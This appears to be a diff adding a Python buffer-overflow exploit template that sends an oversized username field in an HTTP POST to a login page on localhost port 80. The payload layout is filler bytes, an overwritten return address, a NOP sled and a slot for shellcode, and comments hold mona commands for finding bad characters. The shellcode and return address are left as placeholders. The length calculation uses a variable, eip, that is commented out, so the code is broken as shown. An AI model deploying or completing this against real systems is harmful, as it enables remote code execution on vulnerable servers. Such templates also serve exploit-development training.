@@ -1,0 +1,62 @@
+#!/usr/bin/python3
+# HTTP Buffer Overflow Template
+
+import socket
+import struct
+
+total_length = 1500
+filler = 780
+# eip = b"B" * 4
+offset = b"C" * 4  
+
+new_eip = struct.pack("<I", <new_eip>)
+
+nop_sled = b"\x90" * 16
+
+# !mona bytearray -cpb "\x00\x0A\x0D"
+# !mona compare -f C:\mona\bytearray.bin -a <eip>
+
+
+# Place shellcode here
+buf =  b""
+
+#overflow payload
+payload = [
+    b"A" * filler,
+    new_eip,
+    offset,
+    nop_sled,
+    buf,
+    b"D" * (total_length - filler - len(eip) - len(offset) - len(nop_sled) - len(buf)) 
+]
+payload = b"".join(payload)
+
+# Replace with appropriate form data
+inputbuffer = b"username=" + payload + b"&password=A"
+
+
+# http headers
+buffer = "POST /login HTTP/1.1\r\n"
+buffer += "Host: 127.0.0.1\r\n"
+buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
+buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+buffer += "Accept-Encoding: gzip, deflate\r\n"
+buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+buffer += "Content-Length: " + str(len(inputbuffer)) + "\r\n"
+buffer += "Connection: keep-alive\r\n"
+buffer += "Referer: http://127.0.0.1/login\r\n"
+buffer += "\r\n"
+
+buffer = bytes(buffer, 'utf-8')
+
+
+buffer += inputbuffer
+
+
+
+s = socket.socket()
+s.connect(("127.0.0.1", 80))
+
+s.send(buffer)
+s.close()
